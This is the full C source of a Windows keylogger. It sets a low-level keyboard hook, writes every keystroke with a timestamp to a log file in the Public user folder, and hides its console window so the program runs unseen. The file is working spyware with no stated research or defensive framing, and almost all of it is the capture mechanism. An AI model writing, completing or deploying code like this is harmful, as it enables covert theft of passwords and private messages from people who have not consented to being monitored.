#include <windows.h>
#include <stdio.h>
#include <time.h>

HHOOK hHook;
FILE *logFile;

const char* KeyToString(DWORD vkCode) {
    switch (vkCode) {
        case VK_BACK: return "[Backspace]";
        case VK_RETURN: return "[Enter]";
        case VK_SHIFT: return "[Shift]";
        case VK_CONTROL: return "[Ctrl]";
        case VK_MENU: return "[Alt]";
        case VK_TAB: return "[Tab]";
        case VK_CAPITAL: return "[CapsLock]";
        case VK_ESCAPE: return "[Esc]";
        case VK_SPACE: return " ";
        case VK_LEFT: return "[Left]";
        case VK_RIGHT: return "[Right]";
        case VK_UP: return "[Up]";
        case VK_DOWN: return "[Down]";
        case VK_HOME: return "[Home]";
        case VK_END: return "[End]";
        case VK_PRIOR: return "[PageUp]";
        case VK_NEXT: return "[PageDown]";
        case VK_INSERT: return "[Insert]";
        case VK_DELETE: return "[Delete]";
        case VK_SNAPSHOT: return "[PrintScreen]";
        case VK_SCROLL: return "[ScrollLock]";
        case VK_PAUSE: return "[Pause]";

        // F1–F12 keys
        case VK_F1: return "[F1]";
        case VK_F2: return "[F2]";
        case VK_F3: return "[F3]";
        case VK_F4: return "[F4]";
        case VK_F5: return "[F5]";
        case VK_F6: return "[F6]";
        case VK_F7: return "[F7]";
        case VK_F8: return "[F8]";
        case VK_F9: return "[F9]";
        case VK_F10: return "[F10]";
        case VK_F11: return "[F11]";
        case VK_F12: return "[F12]";

        // Numpad keys
        case VK_NUMPAD0: return "[Num0]";
        case VK_NUMPAD1: return "[Num1]";
        case VK_NUMPAD2: return "[Num2]";
        case VK_NUMPAD3: return "[Num3]";
        case VK_NUMPAD4: return "[Num4]";
        case VK_NUMPAD5: return "[Num5]";
        case VK_NUMPAD6: return "[Num6]";
        case VK_NUMPAD7: return "[Num7]";
        case VK_NUMPAD8: return "[Num8]";
        case VK_NUMPAD9: return "[Num9]";
        case VK_DECIMAL: return "[Num.]";
        case VK_DIVIDE: return "[Num/]";
        case VK_MULTIPLY: return "[Num*]";
        case VK_SUBTRACT: return "[Num-]";
        case VK_ADD: return "[Num+]";

        case VK_LWIN:
        case VK_RWIN: return "[Win]";
        default: return NULL;
    }
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT*)lParam;

        time_t now = time(NULL);
        struct tm *tstruct = localtime(&now);
        char timebuf[64];
        strftime(timebuf, sizeof(timebuf), "[%Y-%m-%d %H:%M:%S] ", tstruct);

        char logLine[128];
        const char* keyStr = KeyToString(kbd->vkCode);

        if (keyStr) {
            snprintf(logLine, sizeof(logLine), "%s%s\n", timebuf, keyStr);
        } else {
            BYTE keyState[256];
            char buf[2] = {0};
            GetKeyboardState(keyState);
            if (ToAscii(kbd->vkCode, kbd->scanCode, keyState, (LPWORD)buf, 0) == 1 && buf[0] >= 32) {
                snprintf(logLine, sizeof(logLine), "%s%c\n", timebuf, buf[0]);
            } else {
                snprintf(logLine, sizeof(logLine), "%s[VK:%d]\n", timebuf, kbd->vkCode);
            }
        }

        fprintf(logFile, "%s", logLine);
        fflush(logFile);
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    logFile = fopen("C:\\Users\\Public\\keylog.txt", "a");
    if (!logFile) return 1;

    HINSTANCE hInstance = GetModuleHandle(NULL);
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0);
    if (!hHook) {
        fclose(logFile);
        return 1;
    }

    // Hide console
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {}

    UnhookWindowsHookEx(hHook);
    fclose(logFile);
    return 0;
}
